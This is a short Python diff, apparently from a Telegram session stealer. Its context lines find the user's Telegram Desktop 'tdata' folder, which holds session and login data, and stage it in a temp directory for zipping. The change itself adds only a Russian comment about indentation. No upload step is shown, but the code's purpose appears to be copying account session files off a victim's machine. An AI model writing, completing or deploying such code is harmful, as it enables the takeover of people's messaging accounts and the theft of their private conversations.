@@ -38,6 +38,7 @@ def create_zip_archive(source_dir, output_zip):
 user = os.path.expanduser("~")
 if os.path.exists(user + "\\AppData\\Roaming\\Telegram Desktop\\tdata"):
     try:
+        # Здесь должен быть блок кода с правильными отступами
         source_dir = user + '\\AppData\\Roaming\\Telegram Desktop\\tdata'
         temp_dir = os.path.join(os.getcwd(), 'temp')
         if not os.path.exists(temp_dir):
